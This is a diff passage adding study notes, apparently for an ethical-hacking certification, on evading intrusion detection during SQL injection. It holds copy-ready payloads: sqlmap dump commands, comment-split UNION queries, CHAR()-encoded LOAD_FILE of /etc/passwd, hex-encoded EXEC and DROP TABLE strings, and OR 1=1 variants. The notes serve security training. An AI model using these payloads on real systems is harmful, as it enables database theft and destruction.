@@ -10195,3 +10195,137 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=U -D acuart -T users --columns && \
 						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=U -D acuart -T users --dump
 					- This command first retrieves column names from the "users" table (--columns) and then extracts all user data (--dump) from the database.
+	- Evasion Techniques:
+		- Firewalls and intrusion detection systems (IDS) can detect SQL injection attempts based on predefined signatures. Even if these network security measures are in place, attackers employ evasion techniques to bypass detection and execute SQL injection. Such techniques include hex encoding, whitespace manipulation, inline comments, sophisticated pattern matching, character encoding, and more.
+		- Evading IDS:
+			- An Intrusion Detection System (IDS) is deployed on a network to detect malicious activities. Typically, it operates based on either a signature or an anomaly detection model. To detect SQL injection, an IDS sensor is placed at the database server to inspect SQL statements.
+			- Attackers use IDS evasion techniques to obscure input strings, preventing detection by signature-based detection systems. A signature is a regular expression that describes a string pattern associated with a known attack. In a signature-based IDS, the system must be aware of the attack beforehand to detect it. The system constructs a database of attack signatures and then analyzes input strings against this database at runtime. If any input matches an attack signature, the IDS triggers an alarm.
+			- This issue is particularly common in network-based IDS (NIDS) and signature-based NIDS. As a result, attackers attempt to bypass these systems using various signature evasion techniques. These techniques include different encoding methods, packet input fragmentation, altering expressions to their equivalent forms, inserting white spaces, and more.
+			- Types of Signature Evasion Techniques:
+				- In-line Comment: Inserts in-line comments between SQL keywords to obscure input strings.
+				- Character Encoding: Uses built-in character encoding functions (e.g., CHAR()) to represent characters.
+				- String Concatenation: Creates SQL keywords by concatenating text using database-specific instructions.
+				- Obfuscated Code: Constructs SQL statements in a way that makes them difficult to interpret.
+				- Manipulating White Spaces: Inserts white spaces between SQL keywords to obscure input strings.
+				- Hex Encoding: Represents an SQL query string using hexadecimal encoding.
+				- Sophisticated Matches: Uses alternative expressions for OR 1=1 to avoid detection.
+				- URL Encoding: Obscures input strings by adding a percent sign (%) before each code point.
+				- Null Byte Injection: Inserts a null byte (%00) before a string to bypass detection mechanisms.
+				- Case Variation: Mixes uppercase and lowercase letters within an SQL statement to evade detection.
+				- Declare Variables: Uses variables to pass specially crafted SQL statements, bypassing the detection mechanism.
+				- IP Fragmentation: Splits attack payloads into multiple packet fragments to evade signature-based detection.
+				- Variations: Uses a WHERE statement that always evaluates as TRUE, allowing mathematical or string comparisons to be used for evasion.
+			- Evasion Technique: In-line Comment:
+				- An evasion technique is effective when a signature-based filter removes white spaces from input strings. In this method, an attacker obfuscates the input string using in-line comments. These comments create SQL statements that may appear syntactically incorrect but remain valid, allowing attackers to bypass input filters.
+				- In-line comments enable an attacker to write SQL statements without using traditional white spaces. For example, /* ... */ is used in SQL to delimit multi-line comments.
+				- Example:
+					- '/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/username/**/LIKE/**/'admin'--
+					- Attackers can also inject in-line comments within SQL keywords to further evade detection: '/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/**/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'admin'--
+					- This technique effectively breaks up SQL keywords while keeping the query functional, making it harder for signature-based intrusion detection systems to recognize malicious input.
+			- Evasion Technique: Character Encoding:
+				- The CHAR() function allows an attacker to encode common injection variables within an input string to evade detection by network security signatures. This function converts hexadecimal or decimal values into characters that can easily pass through SQL engine parsing. In MySQL, the CHAR() function can be used for SQL injection without requiring double quotes.
+				- Examples:
+					- Loading files in UNION queries (e.g., /etc/passwd): ' UNION SELECT 1, (LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100))), 1, 1, 1;
+					- Injecting without quotes (e.g., %): ' OR username LIKE CHAR(37);
+					- Injecting a username without quotes (e.g., "root"): ' UNION SELECT * FROM users WHERE login = CHAR(114,111,111,116);
+					- Checking for existing files (e.g., "n.ext"): ' AND 1 = (IF((LOAD_FILE(CHAR(110,46,101,120,116)) <> CHAR(39,39)), 1, 0));
+				- By encoding SQL queries in this manner, attackers can bypass signature-based detection systems, making it more challenging for security mechanisms to identify malicious input.
+			- Evasion Technique: String Concatenation:
+				- This technique breaks a single string into multiple pieces and concatenates them at the SQL level. The SQL engine then reconstructs the original string from these fragments. Attackers use concatenation to obfuscate identifiable keywords, helping them evade intrusion detection systems. The concatenation syntax varies across different databases.
+				- Signature-based detection is ineffective against such concatenated strings because traditional signature verification compares only the strings on both sides of the = sign. A simple string can be split into multiple parts and then reassembled using concatenation operators.
+				- For example:
+					- SQL Server:
+						- Uses the + operator
+						- Example: OR 'Simple' = 'Sim' + 'ple'
+					- Oracle:
+						- Uses the || operator
+						- Example: '; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+					- Microsoft SQL Server (MSSQL):
+						- Example: '; EXEC ('DRO' + 'P T' + 'AB' + 'LE')
+					- MySQL:
+						- Uses the CONCAT function
+						- Example: '; EXECUTE CONCAT('INSE', 'RT US', 'ER')
+				- By using string concatenation, attackers can bypass detection mechanisms that rely on fixed keyword patterns. This technique allows them to construct malicious SQL statements dynamically instead of using direct, easily identifiable queries.
+			- Evasion Technique: Obfuscated Code:
+				- Attackers can obfuscate malicious SQL queries to evade detection by an Intrusion Detection System (IDS) using two primary methods:
+				- Wrapping:
+					- Attackers use a wrap utility to obfuscate a malicious SQL query before sending it to the database. Since the obfuscated query does not match known IDS signatures, it bypasses detection and is allowed to execute.
+				- SQL String Obfuscation:
+					- In this method, SQL strings are obfuscated using techniques such as:
+						- Concatenation of SQL strings
+						- Encrypting or hashing strings and decrypting them at runtime
+					- These obfuscation techniques prevent IDS from detecting known malicious patterns, allowing attackers to bypass signature-based detection.
+					- Examples of Obfuscated Code for the String "qwerty":
+						- REVERSE(CONCAT(IF(1, CHAR(121), 2), 0x74, RIGHT(LEFT(0x567210, 2), 1), LOWER(MID('TEST', 2, 1)), REPLACE(0x7074, 'pt', 'w'), CHAR(INSTR(123321, 33) + 110)))
+						- CONCAT(UNHEX(LEFT(CRC32(31337), 3) - 400), UNHEX(CEIL(ATAN(1) * 100 - 2)), UNHEX(ROUND(LOG(2) * 100) - 4), CHAR(114), CHAR(RIGHT(COT(31337), 2) + 54), CHAR(POW(11, 2)))
+					- Bypassing IDS Signatures with Obfuscation:
+						- An attacker can modify a malicious request to avoid signature-based detection.
+						- Example of a Standard Attack Signature: /?id=1+union+(select+1,2+from+test.users)
+						- Obfuscated Variants to Evade Detection:
+							- /?id=(1)unIon(selEct(1), mid(hash,1,32) from (test.users))
+							- /?id=1+union+(sELect '1', CONCAT(login, hash) from test.users)
+							- /?id=(1)union(((((((select(1), HEX(hash) from (test.users))))))))
+						- By altering case sensitivity, adding unnecessary parentheses, or using SQL functions creatively, attackers can bypass IDS rules that rely on static pattern matching.
+			- Evasion Technique: Manipulating White Spaces:
+				- Modern signature-based SQL injection detection engines can identify attacks that involve variations in the number and encoding of white spaces around malicious SQL code. However, these engines often fail to detect the same payload when spaces are removed or manipulated.
+				- The white space manipulation technique obfuscates input strings by adding, removing, or replacing white spaces between SQL keywords, strings, or numeric literals—without altering the execution of the SQL statement.
+				- Methods of White Space Manipulation:
+					- Using Special Characters:
+						- Inserting tabs (\t), carriage returns (\r), or line feeds (\n) instead of regular spaces can make an SQL statement harder to detect.
+						- Example:
+							- UNION
+							- SELECT
+						- This is different from the standard "UNION SELECT" signature, making it harder for detection systems to recognize.
+					- Removing Spaces:
+						- Some SQL databases allow execution without spaces, making queries difficult to match against IDS signatures.
+						- Example:
+							- 'OR'1'='1'
+							- This is still a valid SQL injection attempt, even though it lacks spaces.
+				- By exploiting these techniques, attackers can bypass signature-based detection and successfully execute SQL injection attacks while evading security filters.
+			- Evasion Technique: Hex Encoding:
+				- Hex encoding is an evasion technique that represents strings in hexadecimal format. Attackers use hex encoding to obfuscate SQL queries, making them difficult for security measures, such as Intrusion Detection Systems (IDS), to recognize. Since most IDS do not analyze hex-encoded inputs effectively, attackers can exploit this weakness to bypass SQL injection protections. Hex encoding provides numerous ways to obfuscate URLs and SQL statements.
+				- Example of Hex Encoding in SQL Injection:
+					- The string 'SELECT' can be represented in hexadecimal as: 0x73656c656374
+					- This obfuscated version is less likely to be detected by signature-based security mechanisms.
+				- Executing an Obfuscated SQL Query Using Hex Encoding:
+					DECLARE @x VARCHAR(80);
+					SET @x = 0x73656c65637420404076657273696f6e;
+					EXEC (@x);
+				- Note: This statement does not use single quotes ('), further reducing the likelihood of detection.
+				- Additional Examples of Hex Encoding:
+					SELECT @@version = 0x73656c65637420404076657273696f6e
+					DROP TABLE CreditCard = 0x44524f50205461626c652043726564697443617264
+					INSERT INTO USERS ('certifiedhacker', 'qwerty') = 0x494e5345525420696e746f2055534552532028276365727469666965646861636b6572272c20277177657274792729
+				- By converting SQL keywords into hexadecimal format, attackers can evade detection mechanisms while still executing malicious queries successfully.
+			- Evasion Technique: Sophisticated Matches:
+				- Signature-based detection systems are effective at catching common SQL injection patterns, such as "OR 1=1". These detection mechanisms rely on regular expressions to identify various variations of classical injection patterns. However, attackers can bypass these signatures using sophisticated matches—alternative expressions that achieve the same effect as the classical match "OR 1=1" but with slight modifications.
+				- Using Sophisticated Matches to Bypass Detection:
+					- Attackers can use equivalent expressions to trick authentication systems. For example, instead of the commonly detected "OR 1=1", an attacker might use: OR 'john' = 'john'
+					- Since this expression always evaluates to true, it effectively bypasses authentication.
+					- If the system blocks this variation, an attacker can modify it further by adding 'N' to the second string: OR 'john' = N'john'
+					- This small change helps evade detection in advanced security systems that rely on strict signature matching.
+				- Common SQL Injection Characters and Operators:
+					- Attackers also use special SQL characters and operators to manipulate queries and evade detection:
+					=> ' or " → String delimiters
+					=> -- or # → Single-line comment indicators
+					=> /*...*/ → Multi-line comment indicators
+					=> + → Addition or string concatenation (or space in URLs)
+					=> || → String concatenation (double pipe)
+					=> % → Wildcard character in LIKE queries
+					=> ?Param1=foo&Param2=bar → URL parameter manipulation
+					=> PRINT → Executes non-transactional commands
+					=> @variable → Local variable
+					=> @@variable → Global variable
+					=> WAITFOR DELAY '0:0:10' → Introduces a time delay
+				- Examples of Sophisticated Matches for Evading Signature Detection:
+					- Instead of using ' OR 1=1', attackers can modify the query as follows:
+					=> OR 'john' = 'john'
+					=> ' OR 'microsoft' = 'micro' + 'soft'
+					=> ' OR 'movies' = N'movies'
+					=> ' OR 'software' LIKE 'soft%'
+					=> ' OR 7 > 1
+					=> ' OR 'best' > 'b'
+					=> ' OR 'whatever' IN ('whatever')
+					=> ' OR 5 BETWEEN 1 AND 7
+				- These variations produce the same logical outcome as "OR 1=1" but are harder for signature-based security mechanisms to detect.
+				- By leveraging these techniques, attackers can effectively evade detection and exploit vulnerabilities in authentication systems.
